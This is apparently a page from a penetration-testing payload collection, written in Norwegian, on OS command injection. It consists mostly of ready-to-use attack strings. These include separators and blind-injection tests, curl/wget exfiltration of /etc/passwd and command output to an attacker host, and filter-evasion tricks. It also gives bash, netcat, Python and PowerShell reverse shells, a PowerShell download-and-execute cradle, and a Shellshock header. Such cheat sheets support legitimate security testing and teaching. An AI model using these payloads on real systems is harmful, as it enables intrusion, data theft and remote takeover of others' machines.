# 💻 Payloads for kommandoinjeksjon

<!-- language-home-navigation -->
[🏠 Norsk startside](../../README.nb.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](Command-Injection.tr.md) • [🇬🇷 Ελληνικά](Command-Injection.el.md)

> **Begreper og miljø:** Kommandoinjeksjon oppstår når inndata blir tolket som kommandoer; blind testing observerer indirekte utslag som tid eller tilbakekall. Separatorene avhenger av shell: semikolon er ikke en generell separator i Windows cmd.exe, og en tekst med URL-koding krever at applikasjonen faktisk dekoder den. Bash-spesifikke uttrykk og `nc -e` støttes ikke i alle miljøer. DNS-overskriften inneholder også HTTP-baserte curl/wget-eksempler. Kommandoene er bevart som i originalen.

```
 ██████╗ ███████╗     ██████╗ ██████╗ ███╗   ███╗███╗   ███╗ █████╗ ███╗   ██╗██████╗ 
██╔═══██╗██╔════╝    ██╔════╝██╔═══██╗████╗ ████║████╗ ████║██╔══██╗████╗  ██║██╔══██╗
██║   ██║███████╗    ██║     ██║   ██║██╔████╔██║██╔████╔██║███████║██╔██╗ ██║██║  ██║
██║   ██║╚════██║    ██║     ██║   ██║██║╚██╔╝██║██║╚██╔╝██║██╔══██║██║╚██╗██║██║  ██║
╚██████╔╝███████║    ╚██████╗╚██████╔╝██║ ╚═╝ ██║██║ ╚═╝ ██║██║  ██║██║ ╚████║██████╔╝
 ╚═════╝ ╚══════╝     ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝ 
██╗███╗   ██╗     ██╗███████╗ ██████╗████████╗██╗ ██████╗ ███╗   ██╗                   
██║████╗  ██║     ██║██╔════╝██╔════╝╚══██╔══╝██║██╔═══██╗████╗  ██║                   
██║██╔██╗ ██║     ██║█████╗  ██║        ██║   ██║██║   ██║██╔██╗ ██║                   
██║██║╚██╗██║██   ██║██╔══╝  ██║        ██║   ██║██║   ██║██║╚██╗██║                   
██║██║ ╚████║╚█████╔╝███████╗╚██████╗   ██║   ██║╚██████╔╝██║ ╚████║                   
╚═╝╚═╝  ╚═══╝ ╚════╝ ╚══════╝ ╚═════╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝                   
```

---

## 🎯 Kommandoseparatorer

### Linux/Unix
```bash
;       # Semikolon – kjør etterpå
|       # Rør – send utdata til neste kommando
||      # ELLER – kjør hvis den første mislykkes
&       # Bakgrunn – kjør i bakgrunnen
&&      # OG – kjør hvis den første lykkes
`cmd`   # Backticks – kommandosubstitusjon
$(cmd)  # Dollartegn – kommandosubstitusjon
\n      # Linjeskift – skill kommandoer
```

### Windows
```cmd
;       # Fungerer i noen miljøer
|       # Rør
||      # ELLER
&       # Kjør begge
&&      # OG
\n      # Linjeskift
%0a     # URL-kodet linjeskift
```

---

## 💉 Grunnleggende payloads

### Enkel test
```bash
; id
; whoami
| id
| whoami
|| id
|| whoami
& id
& whoami
&& id
&& whoami
`id`
$(id)
```

### URL-kodet
```
%3B+id               # ; id
%7C+id               # | id
%7C%7C+id            # || id
%26+id               # & id
%26%26+id            # && id
%0A+id               # linjeskift + id
```

---

## 🔥 Blind kommandoinjeksjon

### Tidsbasert deteksjon
```bash
# Ventekommandoer
; sleep 5
| sleep 5
|| sleep 5
& sleep 5
&& sleep 5
`sleep 5`
$(sleep 5)

# Windows
; ping -n 5 127.0.0.1
| timeout 5
```

### DNS-basert deteksjon
```bash
# Med nslookup
; nslookup BURP_COLLAB
| nslookup BURP_COLLAB
`nslookup BURP_COLLAB`
$(nslookup BURP_COLLAB)

# Med curl/wget
; curl http://BURP_COLLAB
; wget http://BURP_COLLAB
$(curl http://ATTACKER/?data=$(whoami))
```

### HTTP-basert eksfiltrering
```bash
; curl http://ATTACKER/$(whoami)
; curl http://ATTACKER/?d=$(cat /etc/passwd | base64)
; wget http://ATTACKER/$(hostname)
$(curl http://ATTACKER/?id=$(id))
`curl http://ATTACKER/?user=$(whoami)`
```

---

## 🛡️ Teknikker for å omgå filtre

### Omgåelse av mellomromsfilter
```bash
# Med $IFS (Internal Field Separator, intern feltskiller)
;cat${IFS}/etc/passwd
;cat$IFS/etc/passwd
;{cat,/etc/passwd}

# Med tabulatorer
;cat	/etc/passwd

# Med klammeparenteser
{cat,/etc/passwd}
```

### Omgåelse av nøkkelordfilter
```bash
# Del opp kommandoer
w'h'oami
w"h"oami
who$@ami
who\ami

# Med jokertegn
/bin/ca? /etc/passwd
/bin/c?t /etc/passwd
/b??/c?t /etc/passwd

# Med variabler
$u; cat /etc/passwd
test=cat; $test /etc/passwd

# Heksadesimal koding
echo -e "\x69\x64" | sh    # id
```

### Omgåelse av filter for spesialtegn
```bash
# Med ulike skilletegn
;{cat,/etc/passwd}
;cat</etc/passwd
;cat$IFS/etc/passwd

# Injeksjon av linjeskift
%0aid
%0Acat%20/etc/passwd

# Med kommentarer
; id #
| id #
```

---

## 🐧 Linux-payloads

### Lesing av filer
```bash
; cat /etc/passwd
; head /etc/passwd
; tail /etc/passwd
; less /etc/passwd
; more /etc/passwd
; nl /etc/passwd
; sort /etc/passwd
; uniq /etc/passwd
; strings /etc/passwd
; od -c /etc/passwd
; xxd /etc/passwd
; base64 /etc/passwd
```

### Kommandokjøring
```bash
; id
; whoami
; uname -a
; hostname
; pwd
; ls -la
; env
; ps aux
; netstat -an
; ifconfig
; ip addr
```

### Omvendt shell
```bash
; bash -i >& /dev/tcp/ATTACKER/4444 0>&1
; nc -e /bin/sh ATTACKER 4444
; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

---

## 🪟 Windows-payloads

### Grunnleggende kommandoer
```cmd
& whoami
& hostname
& ipconfig
& net user
& dir
& type C:\Windows\win.ini
& type C:\Windows\System32\drivers\etc\hosts
```

### Lesing av filer
```cmd
& type C:\Windows\win.ini
& type C:\inetpub\wwwroot\web.config
& more C:\Windows\win.ini
& find "password" C:\path\to\file.txt
```

### PowerShell
```powershell
& powershell -c "whoami"
& powershell -c "Get-Process"
& powershell -c "IEX(New-Object Net.WebClient).downloadString('http://ATTACKER/shell.ps1')"
```

### Omvendt shell
```cmd
& powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

---

## 📝 Vanlige injeksjonspunkter

```
URL-parametere:
  ?ip=127.0.0.1;id
  ?file=test.txt|id
  ?cmd=ls

POST-parametere:
  filename=test.txt;id
  host=localhost|whoami

Headere:
  User-Agent: () { :;}; /bin/bash -c 'cat /etc/passwd'
  X-Forwarded-For: ;id

Filnavn ved opplasting:
  test;id;.txt
  test$(id).txt
  test`id`.txt
```

---

## 📋 Sjekkliste for testing

```markdown
□ Test alle kommandoseparatorer (; | || & && ` $())
□ Test URL-kodede varianter
□ Test tidsbasert blind injeksjon
□ Test DNS-/HTTP-eksfiltrering
□ Test omgåelse av mellomromsfilter ($IFS, tabulatorer, klammeparenteser)
□ Test omgåelse av nøkkelordfilter (anførselstegn, jokertegn)
□ Test injeksjon av linjeskift (%0a)
□ Se etter filtrerte tegn
□ Prøv både Linux- og Windows-kommandoer
```

---

## 🔗 Relaterte payloads

- [LFI-payloads](LFI.nb.md)
- [SSTI-payloads](SSTI.nb.md)

---

**Tilbake til payloadsamlingen:** [💉 Payloadsamling](../../README.md#-payloads-collection)
